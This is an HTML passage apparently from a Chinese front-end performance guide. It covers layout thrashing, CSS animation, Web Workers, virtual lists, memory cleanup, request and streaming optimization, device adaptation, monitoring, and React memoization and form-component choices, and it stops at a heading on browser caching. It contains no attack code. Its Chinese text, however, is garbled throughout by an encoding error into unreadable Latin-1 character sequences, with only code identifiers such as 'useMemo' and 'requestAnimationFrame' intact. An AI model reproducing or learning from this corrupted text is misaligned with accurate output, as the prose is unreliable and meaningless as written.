<h4 data-id="heading-17"><strong>ï¼ˆ2ï¼‰æ¸²æŸ“é˜¶æ®µä¼˜åŒ–ï¼šç»˜åˆ¶é«˜æ•ˆä¸é¿å…æŠ–åŠ¨</strong></h4>
<p>ç›®æ ‡ï¼š<strong>åŠ é€Ÿé¦–å±ç»˜åˆ¶ï¼Œæœ€å°åŒ–é‡æ’ä¸é‡ç»˜</strong>ã€‚</p>
<h5 data-id="heading-18"><strong>1. é¿å…å¸ƒå±€æŠ–åŠ¨</strong></h5>
<ul>
<li><strong>è¯»å†™åˆ†ç¦»</strong>ï¼šé¿å…åœ¨å¾ªç¯ä¸­è¿ç»­è¯»å–ï¼ˆå¦‚Â <code>offsetHeight</code>ï¼‰ç„¶åå†™å…¥æ ·å¼ï¼Œåº”æ‰¹é‡è¯»å–åç»Ÿä¸€å†™å…¥ã€‚</li>
<li><strong>ä½¿ç”¨Â <code>DocumentFragment</code></strong>ï¼šè¿›è¡Œç¦»çº¿DOMæ“ä½œï¼Œå®Œæˆåä¸€æ¬¡æ€§æ’å…¥æ–‡æ¡£ã€‚</li>
<li><strong>é¿å…å¼ºåˆ¶åŒæ­¥å¸ƒå±€</strong>ï¼šåœ¨Â <code>requestAnimationFrame</code>Â å›è°ƒä¸­å¤„ç†æ ·å¼ä¿®æ”¹ï¼Œä¸æµè§ˆå™¨åˆ·æ–°ç‡åŒæ­¥ã€‚</li>
</ul>
<h5 data-id="heading-19"><strong>2. CSSä¼˜åŒ–</strong></h5>
<ul>
<li><strong>ç®€åŒ–é€‰æ‹©å™¨</strong>ï¼šé¿å…è¿‡äºå¤æ‚çš„é€‰æ‹©å™¨é“¾ï¼Œå‡å°‘æ ·å¼è®¡ç®—å¼€é”€ã€‚</li>
<li><strong>ä¼˜åŒ–åŠ¨ç”»å±æ€§</strong>ï¼š<strong>ä»…ä½¿ç”¨Â <code>transform</code>Â å’ŒÂ <code>opacity</code></strong>Â åˆ¶ä½œåŠ¨ç”»ï¼Œå®ƒä»¬åªè§¦å‘<strong>åˆæˆå±‚ï¼ˆCompositingï¼‰</strong> æ›´æ–°ï¼Œç”±GPUå¤„ç†ï¼Œæ€§èƒ½æé«˜ã€‚é¿å…ä½¿ç”¨Â <code>left</code>,Â <code>top</code>,Â <code>margin</code>Â ç­‰è§¦å‘å¸ƒå±€å’Œç»˜åˆ¶çš„å±æ€§ã€‚â˜…â˜…â˜…</li>
<li><strong>æå‡ä¸ºåˆæˆå±‚</strong>ï¼šå¯¹å¤æ‚åŠ¨ç”»å…ƒç´ è°¨æ…ä½¿ç”¨Â <code>will-change: transform</code>Â æˆ–Â <code>translateZ(0)</code>ï¼Œæç¤ºæµè§ˆå™¨æå‰ä¼˜åŒ–ã€‚</li>
<li><strong>ä½¿ç”¨Flexbox/Gridå¸ƒå±€</strong>ï¼šç›¸æ¯”ä¼ ç»Ÿæµ®åŠ¨å’Œå®šä½å¸ƒå±€ï¼Œæ€§èƒ½æ›´ä¼˜ä¸”æ›´ä¸æ˜“å¼•å‘å¸ƒå±€é—®é¢˜ã€‚â˜…â˜…â˜…</li>
</ul>
<h5 data-id="heading-20"><strong>3. é¦–å±ä½“éªŒä¼˜åŒ–</strong>â˜…â˜…â˜…</h5>
<ul>
<li><strong>æœåŠ¡ç«¯æ¸²æŸ“/é™æ€ç”Ÿæˆ</strong>ï¼šå¯¹äºå†…å®¹å‹AIé¡µé¢ï¼Œä½¿ç”¨Next.js/Nuxt.jsç­‰æ¡†æ¶è¿›è¡ŒSSR/SSGï¼Œç›´å‡ºHTMLï¼Œæ¶ˆé™¤ç™½å±ã€‚â˜…â˜…â˜…</li>
<li><strong>éª¨æ¶å±</strong>ï¼šåœ¨æ•°æ®åŠ è½½å‰ï¼Œå±•ç¤ºä¸æœ€ç»ˆé¡µé¢ç»“æ„ç›¸ä¼¼çš„ç°è‰²å ä½å›¾ï¼Œæå¤§æå‡æ„ŸçŸ¥é€Ÿåº¦ã€‚â˜…â˜…â˜…</li>
</ul>
<h4 data-id="heading-21"><strong>ï¼ˆ3ï¼‰è¿è¡Œé˜¶æ®µä¼˜åŒ–ï¼šäº¤äº’æµç•…ä¸å†…å­˜å¥åº·</strong></h4>
<p>ç›®æ ‡ï¼š<strong>ç¡®ä¿ä¸»çº¿ç¨‹å“åº”è¿…é€Ÿï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</strong>ã€‚</p>
<h5 data-id="heading-22"><strong>1. JavaScriptæ‰§è¡Œä¼˜åŒ–</strong></h5>
<ul>
<li>
<p><strong>æ‹†åˆ†é•¿ä»»åŠ¡</strong>ï¼šä»»ä½•è¿ç»­æ‰§è¡Œè¶…è¿‡Â <strong>50ms</strong>Â çš„ä»»åŠ¡éƒ½å¯èƒ½é˜»å¡äº¤äº’ã€‚ä½¿ç”¨Â <code>setTimeout</code>ã€<code>requestIdleCallback</code>Â æˆ–Â <code>Web Worker</code>Â è¿›è¡Œæ‹†åˆ†ã€‚â˜…â˜…â˜…</p>
<ul>
<li><strong>Web Workeråº”ç”¨</strong>ï¼šå°†AIé¡¹ç›®ä¸­çš„<strong>å¤§æ–‡æœ¬å¤„ç†ã€æ¨¡å‹æ¨ç†ï¼ˆTensorFlow.jsï¼‰ã€å¤æ‚è®¡ç®—</strong>ç§»è‡³Workerçº¿ç¨‹ã€‚â˜…â˜…â˜…</li>
</ul>
</li>
<li>
<p><strong>é˜²æŠ–ä¸èŠ‚æµ</strong>ï¼šå¯¹Â <code>resize</code>ã€<code>scroll</code>ã€<code>input</code>ã€<code>mousemove</code>Â ç­‰é«˜é¢‘ç‡äº‹ä»¶è¿›è¡Œæ§åˆ¶ã€‚â˜…â˜…â˜…</p>
</li>
<li>
<p><strong>äº‹ä»¶å§”æ‰˜</strong>ï¼šåˆ©ç”¨äº‹ä»¶å†’æ³¡ï¼Œåœ¨çˆ¶èŠ‚ç‚¹ç»Ÿä¸€å¤„ç†å­å…ƒç´ äº‹ä»¶ï¼Œå‡å°‘ç›‘å¬å™¨æ•°é‡ã€‚â˜…â˜…â˜…</p>
</li>
</ul>
<h5 data-id="heading-23"><strong>2. é«˜æ•ˆæ•°æ®æ¸²æŸ“</strong></h5>
<ul>
<li>
<p><strong>è™šæ‹Ÿåˆ—è¡¨</strong>ï¼šå¯¹äºAIå¯¹è¯è®°å½•ã€ç”Ÿæˆç»“æœç­‰é•¿åˆ—è¡¨ï¼Œ<strong>åªæ¸²æŸ“å¯è§†åŒºåŸŸåŠå…¶é™„è¿‘çš„DOMå…ƒç´ </strong>ï¼ˆä½¿ç”¨Â <code>react-window</code>ã€<code>vue-virtual-scroller</code>Â ç­‰ï¼‰ã€‚â˜…â˜…â˜…</p>
</li>
<li>
<p><strong>Canvasä¼˜åŒ–</strong>ï¼šå¯¹äºAIç»˜å›¾æˆ–æ•°æ®å¯è§†åŒ–ï¼šâ˜…â˜…â˜…</p>
<ul>
<li>ä½¿ç”¨åˆ†å±‚Canvasï¼Œä»…é‡ç»˜å˜åŒ–çš„å±‚ã€‚</li>
<li>é™åˆ¶ç”»å¸ƒåˆ†è¾¨ç‡ï¼Œé€‚é…æ˜¾ç¤ºå°ºå¯¸å³å¯ã€‚</li>
<li>åˆ©ç”¨Â <code>OffscreenCanvas</code>Â åœ¨Workerä¸­ç»˜å›¾ã€‚</li>
</ul>
</li>
</ul>
<h5 data-id="heading-24"><strong>3. å†…å­˜ç®¡ç†</strong></h5>
<ul>
<li><strong>åŠæ—¶æ¸…ç†</strong>ï¼šç§»é™¤ä¸å†éœ€è¦çš„äº‹ä»¶ç›‘å¬å™¨ã€å®šæ—¶å™¨ã€WebSocketè¿æ¥ã€‚</li>
<li><strong>é¿å…æ„å¤–å…¨å±€å˜é‡</strong>ã€‚</li>
<li><strong>è§£é™¤å¼•ç”¨</strong>ï¼šå¯¹äºä¸å†éœ€è¦çš„å¤§å‹å¯¹è±¡ï¼ˆå¦‚AIç”Ÿæˆçš„é«˜æ¸…å›¾ç‰‡æ•°æ®URLï¼‰ï¼Œæ‰‹åŠ¨è®¾ç½®ä¸ºÂ <code>null</code>ã€‚</li>
<li><strong>ä½¿ç”¨å¼±å¼•ç”¨</strong>ï¼šå¯¹äºç¼“å­˜åœºæ™¯ï¼Œè€ƒè™‘ä½¿ç”¨Â <code>WeakMap</code>Â å’ŒÂ <code>WeakSet</code>ã€‚â˜…â˜…â˜…</li>
</ul>
<h4 data-id="heading-25"><strong>ï¼ˆ4ï¼‰ç½‘ç»œäº¤äº’ä¼˜åŒ–ï¼šè¯·æ±‚é«˜æ•ˆä¸å¼±ç½‘å‹å¥½</strong></h4>
<p>ç›®æ ‡ï¼š<strong>å‡å°‘è¯·æ±‚æ•°é‡ã€å‹ç¼©ä¼ è¾“æ•°æ®ã€æå‡è¿æ¥æ•ˆç‡</strong>ã€‚</p>
<h5 data-id="heading-26"><strong>1. è¯·æ±‚ä¼˜åŒ–</strong></h5>
<ul>
<li><strong>åˆå¹¶è¯·æ±‚</strong>ï¼šå°†åŒç±»å‹å°è¯·æ±‚åˆå¹¶ï¼ˆå¦‚å¤šä¸ªé…ç½®æŸ¥è¯¢ï¼‰ã€‚</li>
<li><strong>è¯·æ±‚ä¼˜å…ˆçº§ç®¡ç†</strong>ï¼šæ ¸å¿ƒæ¥å£ä¼˜å…ˆï¼Œéå…³é”®è¯·æ±‚ï¼ˆå¦‚æ—¥å¿—ã€ç»Ÿè®¡ï¼‰å»¶è¿Ÿæˆ–ç©ºé—²æ—¶å‘é€ã€‚</li>
<li><strong>å–æ¶ˆæ— ç”¨è¯·æ±‚</strong>ï¼šåœ¨ç»„ä»¶å¸è½½æˆ–ç”¨æˆ·è·³è½¬æ—¶ï¼Œå–æ¶ˆæœªå®Œæˆçš„Â <code>fetch</code>Â /Â <code>axios</code>Â è¯·æ±‚ã€‚</li>
<li><strong>æ¥å£ç¼“å­˜</strong>ï¼šå¯¹éå®æ—¶AIæ•°æ®ï¼ˆå¦‚æ¨¡å‹åˆ—è¡¨ã€å…¬å…±é…ç½®ï¼‰è¿›è¡Œåˆç†çš„æœ¬åœ°æˆ–Service Workerç¼“å­˜ã€‚</li>
</ul>
<h5 data-id="heading-27"><strong>2. æ•°æ®ä¼ è¾“ä¼˜åŒ–</strong></h5>
<ul>
<li><strong>ä½¿ç”¨ç°ä»£æ•°æ®æ ¼å¼</strong>ï¼šè€ƒè™‘ä½¿ç”¨Â <strong>Protocol Buffers (PB)</strong> Â æˆ–Â <strong>MessagePack</strong>Â æ›¿ä»£JSONï¼Œå¯å¤§å¹…å‡å°‘AIæ¨¡å‹è¾“å…¥è¾“å‡ºç­‰å¤§æ•°æ®çš„ä¼ è¾“ä½“ç§¯ã€‚</li>
<li><strong>å¼€å¯å‹ç¼©</strong>ï¼šç¡®ä¿APIå“åº”å¤´åŒ…å«Â <code>Content-Encoding: br</code>Â æˆ–Â <code>gzip</code>ã€‚â˜…â˜…â˜…</li>
<li><strong>æµå¼å“åº”</strong>ï¼šå¯¹äºAIå¯¹è¯ã€æ–‡æœ¬ç”Ÿæˆç­‰åœºæ™¯ï¼Œä½¿ç”¨Â <strong>SSE</strong>Â æˆ–Â <strong>WebSocket</strong>Â è¿›è¡Œæµå¼ä¼ è¾“ï¼Œå®ç°â€œæ‰“å­—æœºâ€æ•ˆæœï¼Œå¤§å¹…é™ä½å¯æ„ŸçŸ¥å»¶è¿Ÿã€‚â˜…â˜…â˜…</li>
</ul>
<h5 data-id="heading-28"><strong>3. ç½‘ç»œç¯å¢ƒé€‚é…</strong></h5>
<ul>
<li><strong>å¼±ç½‘æ£€æµ‹ä¸é™çº§</strong>ï¼šé€šè¿‡Â <code>navigator.connection.effectiveType</code>Â æ£€æµ‹ç½‘ç»œç±»å‹ï¼Œå¼±ç½‘ä¸‹è‡ªåŠ¨é™ä½å›¾ç‰‡è´¨é‡ã€å…³é—­é¢„è§ˆåŠ¨ç”»ã€ä½¿ç”¨æ›´ç®€æ´çš„UIã€‚</li>
<li><strong>CDNä¸è¾¹ç¼˜è®¡ç®—</strong>ï¼šé™æ€èµ„æºéƒ¨ç½²CDNã€‚å°†éƒ¨åˆ†AIé¢„å¤„ç†é€»è¾‘ï¼ˆå¦‚å›¾ç‰‡å‹ç¼©ã€æ ¼å¼è½¬æ¢ï¼‰é€šè¿‡è¾¹ç¼˜å‡½æ•°ï¼ˆå¦‚Cloudflare Workersï¼‰å°±è¿‘å¤„ç†ã€‚</li>
</ul>
<h4 data-id="heading-29"><strong>ï¼ˆ5ï¼‰é€‚é…ä¸å…¼å®¹ä¼˜åŒ–ï¼šå…¼é¡¾å¹¿æ³›ä¸é«˜æ€§èƒ½</strong></h4>
<p>ç›®æ ‡ï¼š<strong>åœ¨ä¸åŒè®¾å¤‡ä¸æµè§ˆå™¨ä¸Šæä¾›å°½å¯èƒ½ä¸€è‡´çš„æ€§èƒ½ä½“éªŒ</strong>ã€‚</p>
<h5 data-id="heading-30"><strong>1. è®¾å¤‡æ€§èƒ½åˆ†çº§</strong></h5>
<ul>
<li><strong>ç¡¬ä»¶æ£€æµ‹</strong>ï¼šé€šè¿‡Â <code>navigator.hardwareConcurrency</code>ï¼ˆCPUæ ¸å¿ƒæ•°ï¼‰å’ŒÂ <code>navigator.deviceMemory</code>ï¼ˆå†…å­˜å¤§å°ï¼‰ç²—ç•¥åˆ¤æ–­è®¾å¤‡èƒ½åŠ›ã€‚</li>
<li><strong>åŠ¨æ€è°ƒæ•´ç­–ç•¥</strong>ï¼šé«˜æ€§èƒ½è®¾å¤‡å¯ç”¨å¤æ‚åŠ¨ç”»å’Œé«˜æ¸…èµ„æºï¼›ä½æ€§èƒ½è®¾å¤‡åˆ™é™çº§ä¸ºç®€å•åŠ¨ç”»å’ŒåŸºç¡€æ•ˆæœã€‚</li>
</ul>
<h5 data-id="heading-31"><strong>2. æµè§ˆå™¨å…¼å®¹ä¸é™çº§</strong></h5>
<ul>
<li>
<p><strong>æ¸è¿›å¢å¼º</strong>ï¼šä¼˜å…ˆä¸ºç°ä»£æµè§ˆå™¨æä¾›æœ€ä½³ä½“éªŒï¼ˆå¦‚ä½¿ç”¨WebGLåŠ é€ŸAIæ¨ç†ï¼‰ï¼ŒåŒæ—¶ä¸ºæ—§æµè§ˆå™¨æä¾›åŸºç¡€å¯ç”¨çš„åŠŸèƒ½ã€‚â˜…â˜…â˜…</p>
</li>
<li>
<p><strong>æŒ‰éœ€Polyfill</strong>ï¼šé€šè¿‡Â <code>@babel/preset-env</code>Â çš„Â <code>useBuiltIns: 'usage'</code>Â ä»…å¼•å…¥ç›®æ ‡æµè§ˆå™¨æ‰€éœ€çš„polyfillã€‚</p>
</li>
<li>
<p><strong>ç§»åŠ¨ç«¯ä¸“é¡¹</strong>ï¼šâ˜…â˜…â˜…</p>
<ul>
<li>è®¾ç½®Â <code>&lt;meta name="viewport" content="width=device-width"&gt;</code>Â æ¶ˆé™¤300msç‚¹å‡»å»¶è¿Ÿã€‚</li>
<li>ä¸ºå¯æ»šåŠ¨åŒºåŸŸæ·»åŠ Â <code>-webkit-overflow-scrolling: touch</code>Â ä»¥å¯ç”¨å¹³æ»‘æ»šåŠ¨ã€‚</li>
<li>ä½¿ç”¨Â <code>touch-action: manipulation</code>Â ç¦ç”¨åŒå‡»ç¼©æ”¾ç­‰é»˜è®¤è¡Œä¸ºã€‚</li>
</ul>
</li>
</ul>
<hr/>
<h4 data-id="heading-32"><strong>ï¼ˆ6ï¼‰æ€§èƒ½ç›‘æ§ä¸æŒç»­è¿­ä»£</strong></h4>
<p>ç›®æ ‡ï¼š<strong>å»ºç«‹é‡åŒ–æŒ‡æ ‡ï¼Œé©±åŠ¨æŒç»­ä¼˜åŒ–</strong>ã€‚</p>
<h5 data-id="heading-33"><strong>1. æ€§èƒ½æŒ‡æ ‡é‡‡é›†</strong></h5>
<ul>
<li><strong>æ ¸å¿ƒWebæŒ‡æ ‡</strong>ï¼šä½¿ç”¨Â <code>web-vitals</code>Â åº“è½»æ¾æµ‹é‡LCPã€FID/INPã€CLSã€‚</li>
<li><strong>è‡ªå®šä¹‰ä¸šåŠ¡æŒ‡æ ‡</strong>ï¼šå¦‚â€œAIå›¾ç‰‡ç”Ÿæˆå®Œæˆæ—¶é—´â€ã€â€œé¦–æ¡å¯¹è¯å“åº”æ—¶é—´â€ã€‚</li>
<li><strong>é•¿ä»»åŠ¡ç›‘æ§</strong>ï¼šä½¿ç”¨Â <code>PerformanceObserver</code>Â ç›‘æ§è¶…è¿‡50msçš„ä»»åŠ¡ã€‚</li>
<li><strong>å†…å­˜ç›‘æ§</strong>ï¼šé€šè¿‡Â <code>performance.memory</code>ï¼ˆChromeï¼‰ç›‘æ§JSå †å¤§å°ã€‚</li>
</ul>
<h5 data-id="heading-34"><strong>2. å·¥å…·ä¸æµç¨‹</strong></h5>
<ul>
<li><strong>å®éªŒå®¤æµ‹è¯•</strong>ï¼šåœ¨CI/CDæµç¨‹ä¸­é›†æˆÂ <strong>Lighthouse CI</strong>ï¼Œè®¾å®šæ€§èƒ½é¢„ç®—ï¼Œä¸åˆæ ¼åˆ™é˜»æ–­å‘å¸ƒã€‚</li>
<li><strong>çœŸå®ç”¨æˆ·ç›‘æ§</strong>ï¼šæ¥å…¥Â <strong>Sentry</strong>ã€<strong>FrontJS</strong>Â ç­‰RUMå¹³å°ï¼Œæ”¶é›†çœŸå®ç¯å¢ƒä¸‹çš„æ€§èƒ½æ•°æ®ã€‚</li>
<li><strong>å¯è§†åŒ–åˆ†æ</strong>ï¼šä½¿ç”¨Â <code>webpack-bundle-analyzer</code>Â å®šæœŸåˆ†æäº§ç‰©æ„æˆï¼Œè­¦æƒ•ä½“ç§¯è†¨èƒ€ã€‚</li>
</ul>
<h4 data-id="heading-35"><strong>ï¼ˆ7ï¼‰Reactæ¡†æ¶ä¸“é¡¹ä¼˜åŒ–ï¼šä»æ¨¡å¼åˆ°ç»†èŠ‚çš„æ€§èƒ½å®è·µ</strong></h4>
<p>Reactåº”ç”¨çš„æ ¸å¿ƒæ€§èƒ½é—®é¢˜é€šå¸¸æºäºÂ <strong>ä¸å¿…è¦çš„é‡æ–°æ¸²æŸ“</strong>ã€‚ä¼˜åŒ–ç›®æ ‡æ˜¯ï¼š<strong>åœ¨æ­£ç¡®çš„æ—¶é—´ã€åªæ¸²æŸ“å¿…è¦çš„ç»„ä»¶</strong>ã€‚</p>
<h4 data-id="heading-36">1. ç”¨Â <code>useCallback</code>Â +Â <code>useMemo</code>Â é¿å…æ— æ„ä¹‰è®¡ç®—ä¸é‡æ¸²æŸ“</h4>
<p>è¿™ä¸¤ä¸ª Hook æ˜¯è§£å†³<strong>å‡½æ•° / è®¡ç®—ç»“æœé‡å¤ç”Ÿæˆå¯¼è‡´å­ç»„ä»¶é‡æ¸²æŸ“</strong>çš„å…³é”®ï¼Œè¦åŒºåˆ†æ¸…æ¥šå„è‡ªçš„ä½¿ç”¨åœºæ™¯ï¼Œé¿å…æ»¥ç”¨ã€‚</p>
<ul>
<li>
<p><strong><code>useCallback</code>ï¼šç¼“å­˜å‡½æ•°å¼•ç”¨</strong></p>
<ul>
<li>åŸç†ï¼šç¼“å­˜å‡½æ•°çš„å¼•ç”¨åœ°å€ï¼Œåªæœ‰å½“ä¾èµ–é¡¹å˜åŒ–æ—¶ï¼Œæ‰ä¼šç”Ÿæˆæ–°çš„å‡½æ•°ã€‚</li>
<li>é€‚ç”¨åœºæ™¯ï¼šçˆ¶ç»„ä»¶ä¼ é€’å‡½æ•°ç»™å­ç»„ä»¶æ—¶ï¼Œè‹¥å­ç»„ä»¶ç”¨Â <code>React.memo</code>Â åšäº†æµ…æ¯”è¾ƒä¼˜åŒ–ï¼Œå¿…é¡»ç”¨Â <code>useCallback</code>Â åŒ…è£¹ä¼ é€’çš„å‡½æ•°ï¼Œå¦åˆ™æ¯æ¬¡çˆ¶ç»„ä»¶æ¸²æŸ“éƒ½ä¼šç”Ÿæˆæ–°å‡½æ•°ï¼Œå¯¼è‡´å­ç»„ä»¶æ— æ•ˆé‡æ¸²æŸ“ã€‚</li>
<li>é¡¹ç›®æ¡ˆä¾‹ï¼šåœ¨ AI å¯è§†åŒ–é¡¹ç›®ä¸­ï¼Œæˆ‘ç»™å›¾è¡¨ç»„ä»¶ä¼ é€’çš„Â <code>onDataChange</code>Â å›è°ƒï¼Œç”¨Â <code>useCallback</code>Â åŒ…è£¹åï¼Œé¿å…äº†å›¾è¡¨ç»„ä»¶å› å‡½æ•°å¼•ç”¨å˜åŒ–è€Œé‡å¤æ¸²æŸ“ï¼Œæå‡äº†å¤§æ•°æ®æ¸²æŸ“æ—¶çš„æµç•…åº¦ã€‚</li>
<li>é¿å‘ç‚¹ï¼š<strong>ä¸è¦æ— è„‘åŒ…è£¹æ‰€æœ‰å‡½æ•°</strong>ï¼Œä¾èµ–é¡¹è¦å†™å…¨ï¼Œå¦åˆ™ä¼šå¯¼è‡´é—­åŒ…é™·é˜±ï¼ˆæ¯”å¦‚å¼•ç”¨æ—§çš„ stateï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>useMemo</code>ï¼šç¼“å­˜è®¡ç®—ç»“æœ</strong></p>
<ul>
<li>åŸç†ï¼šç¼“å­˜å¤æ‚è®¡ç®—çš„ç»“æœï¼Œåªæœ‰ä¾èµ–é¡¹å˜åŒ–æ—¶æ‰ä¼šé‡æ–°è®¡ç®—ã€‚</li>
<li>é€‚ç”¨åœºæ™¯ï¼šç»„ä»¶å†…æœ‰<strong>å¤§é‡è®¡ç®—é€»è¾‘</strong>ï¼ˆæ¯”å¦‚ AI æ¨¡å‹è¾“å‡ºæ•°æ®çš„æ ¼å¼åŒ–ã€é•¿åˆ—è¡¨çš„ç­›é€‰æ’åºï¼‰ï¼Œé¿å…æ¯æ¬¡æ¸²æŸ“éƒ½é‡å¤è®¡ç®—ã€‚</li>
<li>é¡¹ç›®æ¡ˆä¾‹ï¼šåœ¨æ™ºèƒ½è¡¨å•é¡¹ç›®ä¸­ï¼Œæˆ‘ç”¨Â <code>useMemo</code>Â ç¼“å­˜äº†è¡¨å•æ ¡éªŒè§„åˆ™çš„è®¡ç®—ç»“æœï¼ˆä¾èµ–äºè¡¨å•é…ç½®ï¼‰ï¼Œå‡å°‘äº†è¡¨å•ç»„ä»¶æ¯æ¬¡è¾“å…¥æ—¶çš„è®¡ç®—å¼€é”€ï¼Œè¾“å…¥å“åº”é€Ÿåº¦æå‡çº¦ 30%ã€‚</li>
<li>é¿å‘ç‚¹ï¼š<strong>ç®€å•è®¡ç®—æ²¡å¿…è¦ç”¨Â <code>useMemo</code></strong>ï¼ˆæ¯”å¦‚æ•°å­—åŠ å‡ï¼‰ï¼Œå…¶æœ¬èº«æœ‰ç¼“å­˜å¼€é”€ï¼Œåè€Œå¯èƒ½é€‚å¾—å…¶åã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-37">2. åˆç†ä½¿ç”¨å—æ§ç»„ä»¶ vs éå—æ§ç»„ä»¶ï¼Œå¹³è¡¡æ€§èƒ½ä¸å¼€å‘æ•ˆç‡</h4>
<p>è¿™ä¸¤ç§ç»„ä»¶æ¨¡å¼çš„é€‰æ‹©ï¼Œç›´æ¥å½±å“è¡¨å•ç±»ç»„ä»¶çš„æ€§èƒ½å’Œç”¨æˆ·ä½“éªŒï¼Œè¦ç»“åˆåœºæ™¯å–èˆï¼š</p>
<ul>
<li>
<p><strong>å—æ§ç»„ä»¶</strong>ï¼šè¡¨å•æ•°æ®ç”± React state æ§åˆ¶ï¼Œä¼˜ç‚¹æ˜¯å®æ—¶æ ¡éªŒã€æ•°æ®è”åŠ¨æ–¹ä¾¿ï¼›ç¼ºç‚¹æ˜¯<strong>é«˜é¢‘è¾“å…¥åœºæ™¯ä¸‹ï¼ˆæ¯”å¦‚æœç´¢æ¡†å®æ—¶è”æƒ³ï¼‰</strong> ï¼Œæ¯æ¬¡è¾“å…¥éƒ½ä¼šè§¦å‘ state æ›´æ–°å’Œç»„ä»¶é‡æ¸²æŸ“ï¼Œå¯èƒ½æœ‰æ€§èƒ½æŸè€—ã€‚</p>
<ul>
<li>ä¼˜åŒ–æŠ€å·§ï¼šé«˜é¢‘è¾“å…¥åœºæ™¯å¯åŠ <strong>é˜²æŠ–å¤„ç†</strong>ï¼Œæ¯”å¦‚æœç´¢æ¡†è¾“å…¥æ—¶ï¼Œå»¶è¿Ÿ 300ms å†æ›´æ–° stateï¼Œå‡å°‘é‡æ¸²æŸ“æ¬¡æ•°ã€‚</li>
</ul>
</li>
<li>
<p><strong>éå—æ§ç»„ä»¶</strong>ï¼šè¡¨å•æ•°æ®ç”± DOM è‡ªèº«ç»´æŠ¤ï¼Œé€šè¿‡Â <code>ref</code>Â è·å–å€¼ï¼Œä¼˜ç‚¹æ˜¯<strong>æ€§èƒ½æ›´é«˜</strong>ï¼ˆå‡å°‘ state é©±åŠ¨çš„é‡æ¸²æŸ“ï¼‰ï¼›ç¼ºç‚¹æ˜¯æ•°æ®è”åŠ¨ã€å®æ—¶æ ¡éªŒä¸å¦‚å—æ§ç»„ä»¶çµæ´»ã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šæ–‡ä»¶ä¸Šä¼ ã€ç®€å•è¾“å…¥æ¡†ï¼ˆæ— éœ€å®æ—¶æ ¡éªŒï¼‰ã€é«˜é¢‘è¾“å…¥çš„æœç´¢æ¡†ç­‰åœºæ™¯ã€‚</li>
<li>é¡¹ç›®æ¡ˆä¾‹ï¼šåœ¨ AI å¯¹è¯ç³»ç»Ÿçš„è¾“å…¥æ¡†ä¸­ï¼Œæˆ‘é‡‡ç”¨<strong>éå—æ§ç»„ä»¶ + é˜²æŠ– ref å–å€¼</strong>çš„æ–¹æ¡ˆï¼Œæ—¢ä¿è¯äº†ç”¨æˆ·è¾“å…¥çš„æµç•…æ€§ï¼Œåˆé¿å…äº†å®æ—¶ state æ›´æ–°å¸¦æ¥çš„æ€§èƒ½å¼€é”€ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-38">3. é•¿åˆ—è¡¨ä¼˜åŒ–ï¼šè§£å†³å¤§æ•°æ®æ¸²æŸ“çš„æ€§èƒ½ç“¶é¢ˆ</h4>
<p>é•¿åˆ—è¡¨ï¼ˆæ¯”å¦‚ 1000+ æ¡æ•°æ®ï¼‰ç›´æ¥æ¸²æŸ“ä¼šå¯¼è‡´ DOM èŠ‚ç‚¹è¿‡å¤šï¼Œå¼•å‘é¦–å±åŠ è½½æ…¢ã€æ»šåŠ¨å¡é¡¿ï¼Œè¿™æ˜¯å‰ç«¯æ€§èƒ½ä¼˜åŒ–çš„é«˜é¢‘è€ƒç‚¹ï¼Œå°¤å…¶åœ¨ AI æ•°æ®å¯è§†åŒ–åœºæ™¯ä¸­å¾ˆå¸¸è§ã€‚</p>
<ul>
<li>
<p><strong>æ ¸å¿ƒæ–¹æ¡ˆï¼šè™šæ‹Ÿåˆ—è¡¨ï¼ˆVirtual Listï¼‰</strong></p>
<ul>
<li>
<p>åŸç†ï¼šåªæ¸²æŸ“<strong>å½“å‰è§†å£å†…å¯è§çš„åˆ—è¡¨é¡¹</strong>ï¼Œæ»šåŠ¨æ—¶åŠ¨æ€æ›¿æ¢å¯è§†åŒºåŸŸçš„å†…å®¹ï¼Œå¤ç”¨ DOM èŠ‚ç‚¹ï¼Œå‡å°‘ DOM æ•°é‡ã€‚</p>
</li>
<li>
<p>å®ç°æ–¹å¼ï¼š</p>
<ol>
<li>æ‰‹å†™ç®€æ˜“ç‰ˆï¼šé€šè¿‡è®¡ç®—è§†å£é«˜åº¦ã€åˆ—è¡¨é¡¹é«˜åº¦ï¼Œç¡®å®šå¯è§†åŒºåŸŸçš„èµ·å§‹ / ç»“æŸç´¢å¼•ï¼Œç»“åˆÂ <code>overflow: auto</code>Â å®ç°ã€‚</li>
<li>æˆç†Ÿåº“ï¼šæ¯”å¦‚Â <code>react-window</code>/<code>react-virtualized</code>ï¼Œé€‚åˆå¤æ‚åœºæ™¯ï¼ˆæ¯”å¦‚åŠ¨æ€é«˜åº¦åˆ—è¡¨ã€ç½‘æ ¼å¸ƒå±€ï¼‰ã€‚</li>
</ol>
</li>
</ul>
</li>
<li>
<p><strong>è¡¥å……ä¼˜åŒ–ï¼š</strong></p>
<ul>
<li>åˆ—è¡¨é¡¹ç”¨Â <code>React.memo</code>Â åŒ…è£¹ï¼Œé¿å…å•ä¸ªé¡¹çš„æ— æ•ˆé‡æ¸²æŸ“ï¼›</li>
<li>æ•°æ®åˆ†é¡µåŠ è½½ / æ‡’åŠ è½½ï¼Œç»“åˆåç«¯æ¥å£å®ç°æ»šåŠ¨åŠ è½½æ›´å¤šï¼Œå‡å°‘é¦–å±æ•°æ®é‡ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-39">å…«ã€å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜çš„åŒºåˆ« â˜…â˜…â˜…</h2>
<p>å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜éƒ½æ˜¯æµè§ˆå™¨çš„ç¼“å­˜æŠ€æœ¯ï¼Œç›®çš„æ˜¯ä¸ºäº†å‡å°‘å¯¹æœåŠ¡å™¨çš„èµ„æºè¯·æ±‚ï¼Œä»æµè§ˆå™¨æœ¬åœ°æ‹¿æ•°æ®ï¼Œå‡å°‘æœåŠ¡å™¨å‹åŠ›ï¼Œæå‡è®¿é—®é€Ÿåº¦ï¼Œä½†æ˜¯å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜åˆæœ‰ä¸åŒã€‚</p>
<h4 data-id="heading-40">å¼ºç¼“å­˜</h4>
